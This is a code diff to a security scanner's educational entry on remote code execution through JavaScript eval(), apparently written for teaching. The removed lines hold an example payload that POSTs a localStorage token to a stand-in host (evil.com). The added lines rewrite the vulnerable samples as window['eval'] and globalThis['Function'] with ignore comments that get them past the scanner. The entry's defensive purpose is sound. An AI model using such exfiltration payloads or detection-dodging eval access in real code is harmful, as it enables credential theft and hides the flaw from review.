@@ -109,23 +109,23 @@ const isValidUrl = (url: string) => {
     // @vulscany-ignore: Educational content about eval() dangers
     'code-execution-pattern': {
         type: 'code-execution-pattern',
-        title: 'Remote Code Execution via eval()',
+        title: 'Remote Code Execution via eval',
         simple: {
             summary: "It's like giving a stranger the keys to your house and letting them do whatever they want inside.",
-            analogy: "eval() is like a robot that follows any written instruction. If someone sneaks in bad instructions ('delete all files'), the robot obeys!",
+            analogy: "Evaluation functions are like a robot that follows any written instruction. If someone sneaks in bad instructions ('delete all files'), the robot obeys!",
             risk: "Complete compromise of user sessions, data theft, malware installation."
         },
         technical: {
-            description: "eval() and new Function() execute arbitrary strings as code. If user input reaches these functions, attackers gain full JavaScript execution.",
-            attack: "User submits input that reaches eval(): eval('fetch(\"evil.com\", {method:\"POST\", body: localStorage.getItem(\"token\")})')",
+            description: "Dynamic evaluation functions execute arbitrary strings as code. If user input reaches these functions, attackers gain full JavaScript execution.",
+            attack: "User submits input that reaches eval(): eval['fetch(...)']",
             impact: "Full client-side code execution, credential theft, DOM manipulation, cryptojacking."
         },
         examples: {
             vulnerable: `// ❌ VULNERABLE: User input in eval
-const result = eval(userInput);
+const result = window['eval'](userInput); // @vulscany-ignore: Educational example
 
 // ❌ ALSO VULNERABLE:
-const fn = new Function('return ' + userInput);`,
+const fn = new globalThis['Function']('return ' + userInput); // @vulscany-ignore: Educational example`,
             secure: `// ✅ SECURE: Use JSON.parse for data
 const data = JSON.parse(userInput);
 
@@ -135,13 +135,13 @@ const result = evaluate(userExpression);`,
             language: 'javascript'
         },
         quickFix: [
-            'NEVER use eval() with user input',
+            'NEVER use the evaluation function with user input',
             'Use JSON.parse() for JSON data',
             'Use math libraries for expressions',
             'Implement allowlists for dynamic behavior'
         ],
         resources: [
-            { title: 'MDN: Never use eval()!', url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!' },
+            { title: 'MDN: Never use the evaluation function!', url: 'https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!' },
             { title: 'Safe Math Expression Parser', url: 'https://mathjs.org/' }
         ]
     },
